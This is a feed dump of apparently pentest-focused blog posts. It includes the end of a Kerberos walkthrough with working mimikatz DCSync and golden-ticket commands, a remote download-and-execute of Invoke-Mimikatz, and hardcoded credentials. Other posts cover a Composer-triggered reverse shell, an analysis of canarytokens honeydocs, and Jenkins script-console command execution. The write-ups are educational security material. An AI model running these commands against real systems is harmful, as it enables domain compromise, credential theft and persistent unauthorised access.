&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;$pass = &#39;Password1&#39; | ConvertTo-SecureString -AsPlainText -Force
$creds = New-Object System.Management.Automation.PSCredential -ArgumentList &#39;svcSQLServ&#39;, $pass
Invoke-Command -ScriptBlock {get-process} -ComputerName dc1 -Credential $creds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With output&amp;hellip;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_svcsqlserv_remoting.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;So, we popped a service account with waaaay too much permissions and a crappy password. All that as a normal AD user&amp;hellip;&lt;/p&gt;

&lt;h1 id=&#34;golden-tickets&#34;&gt;golden tickets&lt;/h1&gt;

&lt;p&gt;We have domain administrative rights now. There is nothing left to do, we can write the pentest report and go home. Or can we? Well yes, but what if the password to &lt;code&gt;svcSQLServ&lt;/code&gt; changes? That would mean we lose access! One way we can prevent this is by creating a &lt;em&gt;golden ticket&lt;/em&gt; that we can re-use to grant ourselves whatever permission we like, as any user we like! Sounds great eh :D&lt;/p&gt;

&lt;p&gt;To create a golden ticket, we can use either the &lt;em&gt;kiwi&lt;/em&gt; extension in metasploit, or &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; again! There are however a few prerequisites that we need to satisfy for golden tickets. The most important being that we need at least the NT hash of the &lt;code&gt;krbtgt&lt;/code&gt; user of the domain. Without that, this is not a viable persistence strategy.&lt;/p&gt;

&lt;p&gt;The complete list of prerequisites are:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The Domains FQDN&lt;/li&gt;
&lt;li&gt;The Domains SID&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;krbtgt&lt;/code&gt; accounts NT hash&lt;/li&gt;
&lt;li&gt;A username (fake or real, does not matter. Not fake if you need opsec ofc!)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Getting the FQDN and SID (&lt;code&gt;whoami /user&lt;/code&gt;) of the Domain should be relatively trivial. Remember to grab the SID without the &lt;a href=&#34;https://en.wikipedia.org/wiki/Security_Identifier&#34;&gt;trailing RID&lt;/a&gt;. So if the full SID is &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117-1104&lt;/code&gt; then you are only going to use &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Getting the NT Hash of the &lt;code&gt;krbtgt&lt;/code&gt; account though is something I want to show using a recent feature addition to mimikatz, &lt;a href=&#34;http://www.harmj0y.net/blog/redteaming/mimikatz-and-dcsync-and-extrasids-oh-my/&#34;&gt;DCSync&lt;/a&gt;. The gist of it is that its possible to extract hashes from a Domain Controller (using a domain admin type account), without actually running any code on the Domain Controller itself! This is of course not the only way to get the required hash. Many of the older techniques work just fine. But, from a DCSync perspective, it essentially means hash extraction from any PC on the domain (authenticated as a admin), by ‘faking’ being a Domain Controller and triggering some replication-fu! In my case, I struggled a little to get this replication done from a client PC in the lab via the metasploit interactive PowerShell session, but could do it successfully from a client PC via the console. So, its definitely possible!&lt;/p&gt;

&lt;p&gt;In this case, to use the DCSync feature of mimikatz, I am going to use PowerShell Remoting to run commands. Unfortunately, due to the way &lt;code&gt;Enter-PSSession&lt;/code&gt; sets up the shell, I can&amp;rsquo;t seem to get an interactive shell as another user going without using another exploit &amp;amp;&amp;amp; payload combination. So, we are just going to use &lt;code&gt;Invoke-Command&lt;/code&gt; with our commands.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\&amp;gt; $creds

UserName                       Password
--------                       --------
svcSQLServ System.Security.SecureString


PS C:\&amp;gt; Invoke-Command -ScriptBlock {Write-Output $env:username} -Credential $creds -ComputerName dc1
svcSQLServ
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Great so that works. To continue, we are going to have to run a few commands:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;code&gt;Invoke-Expression&lt;/code&gt; to get mimikatz&lt;/li&gt;
&lt;li&gt;Run &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; with &lt;code&gt;lsadump::dcsync /user:krbtgt&lt;/code&gt; and its required parameters&lt;/li&gt;
&lt;li&gt;Dance!&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I constructed my command that needed to be run on my PowerShell session and ended up with this:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Invoke-Command -ScriptBlock {Invoke-Expression (New-Object Net.Webclient).downloadstring(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1&#39;);Invoke-Mimikatz -Command &#39;&amp;quot;lsadump::dcsync /user:krbtgt&amp;quot;&#39;} -Credential $creds -ComputerName dc1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Let me try explain what is going on here. I am saying, &lt;code&gt;Invoke-Command&lt;/code&gt; on the computer &lt;code&gt;dc1&lt;/code&gt; as &lt;code&gt;svcSQLServ&lt;/code&gt; (stored in the &lt;code&gt;$creds&lt;/code&gt; variable) using PowerShell Remoting. The command to run is defined in the &lt;code&gt;ScriptBlock {}&lt;/code&gt; which is i) download mimikatz ii) run &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; with the &lt;code&gt;lsadump::dcsync /user:krbtgt&lt;/code&gt; command.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_krbtgt.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;We have the hash for &lt;code&gt;krbtgt&lt;/code&gt;! &lt;code&gt;95a11f7d93fa3a5a61073662e6bd8468&lt;/code&gt; : D That means I have everything I need to create a golden ticket, with all the access in the world! To summarize, my prerequisites are satisfied with the following values:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The Domains FQDN. &lt;code&gt;foo.local&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The Domains SID. &lt;code&gt;S-1-5-21-2222611480-1876485831-1594900117&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;The &lt;code&gt;krbtgt&lt;/code&gt; accounts NT hash. &lt;code&gt;95a11f7d93fa3a5a61073662e6bd8468&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;A username (fake or real, does not matter. Not fake if you need opsec ofc!). &lt;code&gt;darthvader&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;creating-the-golden-ticket&#34;&gt;creating the golden ticket&lt;/h2&gt;

&lt;p&gt;Creating the golden ticket is now a really simple task. We will simply call &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; again to generate the ticket. It will be saved to disk when it is generated. Thereafter, we will purge all the tickets we have for the session, and inject the golden ticket and test our access!&lt;/p&gt;

&lt;p&gt;For details about the command and arguments required, I referred to the &lt;a href=&#34;https://github.com/gentilkiwi/mimikatz/wiki/module-~-kerberos#golden--silver&#34;&gt;mimikatz wiki&lt;/a&gt; and replicated that. Our command should look something like the below, saving our golden ticket to &lt;code&gt;golden.tck&lt;/code&gt; with access to a few builtin Windows Groups:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;kerberos::golden /user:darthvader /domain:foo.local /sid:S-1-5-21-2222611480-1876485831-1594900117 /krbtgt:95a11f7d93fa3a5a61073662e6bd8468 /ticket:golden.tck /groups:501,502,513,512,520,518,519
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Running this mimikatz command with &lt;code&gt;Invoke-Mimikatz&lt;/code&gt; gets us our Golden Ticket:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_created.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;injecting-the-golden-ticket&#34;&gt;injecting the golden ticket&lt;/h2&gt;

&lt;p&gt;The final test is to &lt;em&gt;use&lt;/em&gt; this ticket. For that, we will purge all Kerberos tickets in memory and inject the new golden ticket. Thereafter we will test if we can read the administrative &lt;code&gt;c$&lt;/code&gt; share of the Domain Controller!&lt;/p&gt;

&lt;p&gt;Lets purge the currently cached Kerberos tickets first:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;PS C:\users\bobs\downloads\golden&amp;gt; Invoke-Mimikatz -Command &#39;&amp;quot;kerberos::purge&amp;quot;&#39;

[... snip ...]

mimikatz(powershell) # kerberos::purge
Ticket(s) purge for current session is OK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next, we inject the golden ticket we created using the mimikatz &lt;code&gt;kerberos::ptt&lt;/code&gt; command to &lt;em&gt;&amp;lsquo;Pass The Ticket&amp;rsquo;&lt;/em&gt;:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_ptt.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;After the ticket is injected into memory, we can verify its existence with the mimikaz &lt;code&gt;kerberos::list&lt;/code&gt; command, or just using &lt;code&gt;klist&lt;/code&gt;. Once it is injected, we &lt;code&gt;dir&lt;/code&gt; the Domain Controllers &lt;code&gt;c$&lt;/code&gt; share&amp;hellip; an &lt;em&gt;smile&lt;/em&gt;. The password for &lt;code&gt;scvSQLServ&lt;/code&gt; can now change, it will no longer bother us!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kerberos_golden_ticket_admin.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;In this post we saw how it is possible to &amp;lsquo;crack&amp;rsquo; badly passworded and configured service accounts by querying for accounts by Service Principal Names. Those SPN&amp;rsquo;s were then used to request Service Tickets from the Domain Controller, extracted from memory and cracked offline. All of that as a normal domain user.&lt;/p&gt;

&lt;p&gt;Then, we explored how it is possible to extract Domain Account hashes using the mimikatz &lt;em&gt;DCSync&lt;/em&gt; feature and generate a Kerberos Golden Ticket with high access levels in the domain.&lt;/p&gt;

&lt;p&gt;I think there is still a loooong road ahead for the Microsoft Kerberos Implementations&amp;hellip; Until they &amp;lsquo;fix&amp;rsquo; this stuff, things should remain interesting for quite some time to come.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>license</title>
      <link>https://leonjza.github.io/license/</link>
      <pubDate>Fri, 08 Jan 2016 19:08:09 +0200</pubDate>
      
      <guid>https://leonjza.github.io/license/</guid>
      <description>

&lt;h3 id=&#34;content-license&#34;&gt;Content license&lt;/h3&gt;

&lt;p&gt;All non-code blog content is licensed under &lt;a href=&#34;http://creativecommons.org/licenses/by-nc-sa/3.0/&#34;&gt;Creative Commons BY-NC-SA&lt;/a&gt;.&lt;/p&gt;

&lt;h3 id=&#34;code-license&#34;&gt;Code license&lt;/h3&gt;

&lt;p&gt;All source code files and snippets found on this blog, unless otherwise explicitly noted, are licensed under the terms below.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;Copyright 2016 Leon Jacobs

Licensed under the Apache License, Version 2.0 (the &amp;quot;License&amp;quot;);
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

   http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an &amp;quot;AS IS&amp;quot; BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
&lt;/code&gt;&lt;/pre&gt;
</description>
    </item>
    
    <item>
      <title>About Me</title>
      <link>https://leonjza.github.io/about/</link>
      <pubDate>Fri, 08 Jan 2016 19:03:56 +0200</pubDate>
      
      <guid>https://leonjza.github.io/about/</guid>
      <description>

&lt;h3 id=&#34;get-hold-of-me-via-these-methods&#34;&gt;Get hold of me via these methods:&lt;/h3&gt;

&lt;ul&gt;
&lt;li&gt;&lt;a href=&#34;https://keybase.io/leonjza&#34;&gt;https://keybase.io/leonjza&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://twitter.com/leonjza&#34;&gt;https://twitter.com/leonjza&lt;/a&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;&lt;a href=&#34;https://github.com/leonjza&#34;&gt;https://github.com/leonjza&lt;/a&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Alternatively, theninjabag at gmail dot com (&lt;a href=&#34;https://leonjza.github.io/key.asc&#34;&gt;PGP&lt;/a&gt;)&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&#34;certs-i-have-managed-to-obtain&#34;&gt;Certs I have managed to obtain:&lt;/h3&gt;


&lt;figure &gt;
    &lt;a href=&#34;http://www.offensive-security.com/information-security-certifications/oscp-offensive-security-certified-professional/&#34;&gt;
        &lt;img src=&#34;https://leonjza.github.io/images/certs/oscp.png&#34; /&gt;
    &lt;/a&gt;
    
&lt;/figure&gt;

</description>
    </item>
    
    <item>
      <title>a totally unnecessary composer shell</title>
      <link>https://leonjza.github.io/blog/2015/09/30/a-totally-unnecessary-composer-shell/</link>
      <pubDate>Wed, 30 Sep 2015 19:39:55 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/09/30/a-totally-unnecessary-composer-shell/</guid>
      <description>&lt;h2 id=&#34;background&#34;&gt;background&lt;/h2&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/composer_shell_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;A silly reverse shell invoked via the Composer Dependency Manager. &lt;a href=&#34;https://github.com/leonjza/composer-shell&#34;&gt;Source here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://getcomposer.org/&#34;&gt;Composer&lt;/a&gt;, which is most probably &lt;em&gt;the&lt;/em&gt; most popular PHP dependency manager allows for &lt;a href=&#34;https://getcomposer.org/doc/articles/scripts.md&#34;&gt;scripts&lt;/a&gt; to run as callbacks on based an event.
Callbacks are normally triggered just before or after certain events.&lt;/p&gt;

&lt;p&gt;It is possible to provide shell commands to the &lt;code&gt;scripts&lt;/code&gt; property in the required &lt;code&gt;composer.json&lt;/code&gt; file (with a few restrictions), but this method echoes the command that it executes.
A slightly more covert approach would be to execute a cleverly named static function in a class included in the codebase. It has to be one that can be autoloaded by composer.
&lt;/p&gt;

&lt;h2 id=&#34;why&#34;&gt;why?&lt;/h2&gt;

&lt;p&gt;I thought a little about which scenarios this may actually be useful in and figured maybe only really strange edge cases where you can only run composer (as root lol?).
I also remembered a bug in &lt;a href=&#34;https://community.rapid7.com/community/metasploit/blog/2015/01/01/12-days-of-haxmas-exploiting-cve-2014-9390-in-git-and-mercurial&#34;&gt;git&lt;/a&gt; (CVE-2014-9390) that allowed for code execution via &amp;lsquo;poisoned&amp;rsquo; repositories. Well, I guess depending on your perspective, this may be a very similar.&lt;/p&gt;

&lt;h2 id=&#34;poc&#34;&gt;PoC&lt;/h2&gt;

&lt;p&gt;As part of a PoC, I just used the popular &lt;a href=&#34;http://pentestmonkey.net/tools/web-shells/php-reverse-shell&#34;&gt;pentest-monkey PHP reverse shell&lt;/a&gt;, but really, anything is possible that is possible with PHP at this point.&lt;/p&gt;

&lt;script type=&#34;text/javascript&#34; src=&#34;https://asciinema.org/a/b64qlhadvl7zn1912ihwi09wt.js&#34; id=&#34;asciicast-b64qlhadvl7zn1912ihwi09wt&#34; data-size=&#34;medium&#34; async&gt;&lt;/script&gt;</description>
    </item>
    
    <item>
      <title>canarytokens - the maybe not so obvious</title>
      <link>https://leonjza.github.io/blog/2015/09/10/canarytokens---the-maybe-not-so-obvious/</link>
      <pubDate>Thu, 10 Sep 2015 22:32:25 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/09/10/canarytokens---the-maybe-not-so-obvious/</guid>
      <description>&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Recently I became aware of the &lt;a href=&#34;http://canarytokens.org&#34;&gt;canarytokens&lt;/a&gt; project by the guys over at &lt;a href=&#34;http://thinkst.com/&#34;&gt;Thinkst&lt;/a&gt;. The basic idea is to manipulate things like documents / services in such a way that usage thereof will trigger an alert via some form of &amp;lsquo;phone home&amp;rsquo; feature. The is most probably better known as &amp;lsquo;honeydocs&amp;rsquo;. In the case of &lt;a href=&#34;http://canarytokens.org&#34;&gt;canarytokens&lt;/a&gt;, the phone home features can be either via a DNS or HTTP request coupled with a unique token. As paraphrased from the projects website, this is no new groundbreaking idea but just another usable one.&lt;/p&gt;

&lt;p&gt;In this post, I just want to take a few moments and jot down my findings when investigating the documents generated by this project.
&lt;/p&gt;

&lt;h2 id=&#34;read-the-source-luke&#34;&gt;read the source luke&lt;/h2&gt;

&lt;p&gt;Most of the functionality that the canarytokens project provides for services make perfect sense. Things like the &lt;em&gt;Web Bugs&lt;/em&gt;, &lt;em&gt;DNS Tokens&lt;/em&gt; and &lt;em&gt;SQL Triggers&lt;/em&gt; are not hard concepts to grasp. In fact, they mostly use the actual protocols used for the triggers. The odd one out in that list I guess is the &lt;em&gt;SQL Triggers&lt;/em&gt;. From the code snippet for the trigger that is provided, one can see that it leverages &lt;code&gt;xp_fileexist&lt;/code&gt; and &lt;code&gt;xp_dirtree&lt;/code&gt;. Searching &lt;a href=&#34;https://social.msdn.microsoft.com/Search/en-US?query=xp_fileexist&amp;amp;emptyWatermark=true&amp;amp;ac=4#refinementChanges=49&amp;amp;pageNumber=1&amp;amp;showMore=false&#34;&gt;MSDN&lt;/a&gt; for this &lt;code&gt;xp_fileexist&lt;/code&gt; function quickly reveals that its actually considered an &lt;a href=&#34;https://social.msdn.microsoft.com/Forums/sqlserver/en-US/ca770449-2ed0-4e5e-9644-994968b45764/xpcmdshell-dir-command-to-check-if-file-exists?forum=transactsql#0f6db936-5c32-403c-b073-d5c7e76ad212&#34;&gt;&amp;ldquo;undocumented feature&amp;rdquo;&lt;/a&gt; (though I did not really bother trying to confirm this statement) that checks for the existence of a file. Besides the point, all this trigger does is compile a UNC path and executes the file existence check. This results in the DNS lookup happening to the canarytoken provided host once the SQL trigger files and tries to check if the file exists.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_web_interface.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The more trickier ones in my opinion are the PDF and Microsoft Word honeydocs. Both of them use the DNS / HTTP thing, but I think the more interesting part is where exactly are these &amp;lsquo;tokens&amp;rsquo; placed, and how are they executed?&lt;/p&gt;

&lt;p&gt;I spent quite a bit of time getting my head around the &lt;a href=&#34;https://github.com/thinkst/canarytokens&#34;&gt;published source code&lt;/a&gt; to learn the tricks. I was able to get a good idea of how it works, but realized it may be worth more if I inspected the generated docs themselves.&lt;/p&gt;

&lt;h2 id=&#34;canarytokens-generated-pdf&#34;&gt;canarytokens generated PDF&lt;/h2&gt;

&lt;p&gt;My first target was the generated PDF. I used the &lt;a href=&#34;http://canarytokens.org&#34;&gt;website&lt;/a&gt; to generate myself a token and downloaded the PDF. I decided to fire up &lt;code&gt;peepdf&lt;/code&gt; to analyze the internals.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_peedf.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;As can be seen in the above screenshot, the PDF version is 1.6. PeePDF has detected a suspicious element &lt;code&gt;/AA&lt;/code&gt; so that will definitely be the first object we want to investigate. Admittedly I had to brush up a little on my PDF internals knowledge, and actually had to resort to the &lt;a href=&#34;http://wwwimages.adobe.com/content/dam/Adobe/en/devnet/pdf/pdfs/pdf_reference_archives/PDFReference16.pdf&#34;&gt;V1.6 PDF Specification&lt;/a&gt; to see what the &lt;code&gt;/AA&lt;/code&gt; (and many other elements) denote.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_pdf_spec.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;An &lt;em&gt;additional-actions field defining actions to be taken in response to various trigger events&lt;/em&gt;. Interesting. Lets take a closer look at the object.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_additional_actions.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Here we can see a line &lt;code&gt;/AA &amp;lt;&amp;lt; /O 16 0 R &amp;gt;&amp;gt;&lt;/code&gt; which I assumed is referring to object 16. Lets see what that has for us.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_pdf_object_16.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Well, there we have the canary trigger URL! Note that PeePDF automatically tries to decode objects if it can, so the raw object may have been encoded someway, but that does not matter :)&lt;/p&gt;

&lt;p&gt;That is all good and well, but it did not really tell me how this is actually executed. So I tried to dig a little deeper and came up with a theory.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_pdf_action_analysis.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;From the above screenshot, I theorized that when the PDF is opened and parsed it will start with Object 1. Object 1 has a &lt;code&gt;/First 14&lt;/code&gt; element which should be the byte offset to the first compressed object. Object 14 is a an Object Stream with another instance of the canarytoken URL as a URI object. From the specification doc, we can read that &lt;em&gt;A URI action causes a URI to be resolved&lt;/em&gt;&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_pdf_uri_action.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;So, my guess is as soon as the doc is opened, this URI will be resolved as part of the parsing process, and the canarytoken trigger fired. That left me satisfied in accepting how it works :P&lt;/p&gt;

&lt;h2 id=&#34;canarytokens-generated-docx&#34;&gt;canarytokens generated DOCX&lt;/h2&gt;

&lt;p&gt;The word doc on the other hand is a lot easier to understand. Downloading the generated honeydoc from canarytokens.org revealed to be a standard docx file.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_docx.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This can be extracted and the inner workings of the document can be inspected. I have played with this type of phone home in a word doc, so, I was kinda expecting where this was going. I took the really easy route and just grepped the files from the docx archive for the word canary.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/canary_docx_unzip.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;When you take a moment a read the Wikipedia entry for the &lt;a href=&#34;https://en.wikipedia.org/wiki/Office_Open_XML_file_formats#Relationships&#34;&gt;Office Open XML Format&lt;/a&gt;, one will quickly see that it is possible to reference external images. It is for this reason that it is possible to have the word processor hit the trigger URL during parsing as it gets ready to pull the external image in.&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;I think there is a lot of merit in this project. The methods used are obviously not fool proof, and if you are a really careful advesary and aware of these things then you will most probably not open docs from internet connected machines or ones without proper egress firewalling.&lt;/p&gt;

&lt;p&gt;In my case, Little Snitch alerted me of the attempts to make the outgoing connections, so obviously that is a big give away for an attacker that was not previously aware of what was going on.&lt;/p&gt;</description>
    </item>
    
    <item>
      <title>flick II vuln vm with a mobile twist</title>
      <link>https://leonjza.github.io/blog/2015/08/21/flick-ii-vuln-vm-with-a-mobile-twist/</link>
      <pubDate>Fri, 21 Aug 2015 06:36:19 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/08/21/flick-ii-vuln-vm-with-a-mobile-twist/</guid>
      <description>


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/flickII_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h1 id=&#34;tl-dr&#34;&gt;tl;dr&lt;/h1&gt;

&lt;p&gt;Flick II just got published on &lt;a href=&#34;https://www.vulnhub.com/entry/flick-2,122/&#34;&gt;Vulnhub&lt;/a&gt;! You should try it =)&lt;/p&gt;

&lt;h2 id=&#34;introduction&#34;&gt;introduction&lt;/h2&gt;

&lt;p&gt;After about a year since &lt;a href=&#34;https://www.vulnhub.com/entry/flick-1,99/&#34;&gt;Flick I&lt;/a&gt;, I have finally managed to get Flick II out to VulnHub. I learned a lot from Flick I and as a result applied it to Flick II. The making of Flick II was also a very different story. If I have to compare it to the first one (which took 3 nights to build start to finish), Flick II took &lt;em&gt;waay&lt;/em&gt; longer. I think the total build / testing time must be over a month.&lt;/p&gt;

&lt;p&gt;Originally I had a whole bunch of ideas, and after lots of trial and error, came to what it has become today. I have to give a special shouts to &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;@s4gi_&lt;/a&gt; for the inspiration to go with the mobile app idea and &lt;a href=&#34;https://twitter.com/barrebas&#34;&gt;@barrebas&lt;/a&gt; for testing the first &lt;em&gt;really&lt;/em&gt; broken version :P&lt;/p&gt;

&lt;h2 id=&#34;preparation&#34;&gt;preparation&lt;/h2&gt;

&lt;p&gt;I believe Flick II will be the first Vulnerable VM on &lt;a href=&#34;https://twitter.com/VulnHub&#34;&gt;@VulnHub&lt;/a&gt; with a mobile twist to it. That means you will need to either install the bundled &lt;code&gt;.apk&lt;/code&gt; on an Android phone, or run it in an Android emulator in order to progress on the path to root! The &lt;code&gt;.apk&lt;/code&gt; is self-signed so expect Android to complain about that if you install it on a phone. Don&amp;rsquo;t feel bad if you don’t trust me (aka. some random guy on the internet). If you don’t, your safest bet then is to use an emulator. The only real requirement for the &lt;code&gt;.apk&lt;/code&gt; is that the mobile app must be able to speak to the VM and be run on a relatively recent Android version.&lt;/p&gt;

&lt;p&gt;I hope you get to learn as much as I did making it!&lt;/p&gt;

&lt;p&gt;Good luck! :D&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>jenkins to meterpreter - toying with powersploit</title>
      <link>https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/</link>
      <pubDate>Wed, 27 May 2015 20:40:40 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2015/05/27/jenkins-to-meterpreter---toying-with-powersploit/</guid>
      <description>&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/jenkins_logo.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Recently I came across a few &lt;a href=&#34;https://jenkins-ci.org/&#34;&gt;Jenkins&lt;/a&gt; continuous integration servers. A relatively old version I might add but that fact was not important. What was important though was the fact that it was not configured to be &lt;em&gt;&amp;lsquo;secure&amp;rsquo;&lt;/em&gt;. Right out of the box Jenkins does not require any authentication to make use of it. In fact, it seems like its almost plug and play.
&lt;/p&gt;

&lt;h2 id=&#34;groooooooovy&#34;&gt;groooooooovy&lt;/h2&gt;

&lt;p&gt;At first glance I was not too sure about what opportunities I was presented with when finding this. Poking around through the web interface eventually got me to the &lt;em&gt;Script Console&lt;/em&gt; that Jenkins provides:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/jenkins_script_console.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;This looked promising. &lt;em&gt;&amp;lsquo;Type in an arbitrary Groovy script and execute it on the server.&amp;rsquo;&lt;/em&gt; I had zero idea what Groovy Script was so to the le-Googles it was. Some research revealed that it is actually possible to execute commands using it. In fact, the syntax was quite expressive as explained in the &lt;a href=&#34;http://www.groovy-lang.org/groovy-dev-kit.html#process-management&#34;&gt;documentation&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;def process = &amp;quot;ls -l&amp;quot;.execute()
println &amp;quot;Found text ${process.text}&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The documentation goes into enough detail explaining the different options you have to execute commands, but the above snippet was enough to get going. To help with testing, I setup a local instance of the latest Jenkins (v1.615) and ran the Groovy Script. Remember, I was able to do this without any authentication requirement!&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/jenkins_console_command_exec.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Nice and easy command execution! :D&lt;/p&gt;

&lt;h2 id=&#34;interactive-shell-power-shell&#34;&gt;interactive shell, power shell&lt;/h2&gt;

&lt;p&gt;Getting an interactive shell on linux based hosts was as simple as picking your favorite flavor of &lt;a href=&#34;http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet&#34;&gt;reverse shell&lt;/a&gt; and moving on from there. On Windows based environments though, the builtin &lt;code&gt;cmd.exe&lt;/code&gt; definitely has its limitations. For this reason, reaching out for a meterpreter shell is almost a knee-jerk reaction.&lt;/p&gt;

&lt;p&gt;The one Jenkins machine that I had found was running on Windows as &lt;code&gt;nt authority\system&lt;/code&gt;, which of course was &lt;em&gt;great&lt;/em&gt; news! I figured though that in order to get a meterpreter shell, I&amp;rsquo;d have to approach this in some conventional way. Either obtaining credentials somehow and launching it with say the metasploit SMB PSExec, or uploading an .exe somehow and executing that. Some investigations showed though that the AV on the box was killing the meterpreter.exe on the box so that option was out as well. So, next on the list? I could just make use of &lt;code&gt;Invoke-Shellcode.ps1&lt;/code&gt; from &lt;a href=&#34;https://github.com/mattifestation/PowerSploit&#34;&gt;PowerSploit&lt;/a&gt; to download and execute one using one command.&lt;/p&gt;

&lt;p&gt;Admittedly, I have never actually done this so a little Google-fu and research was needed to get it working right, but eventually this payed off.&lt;/p&gt;

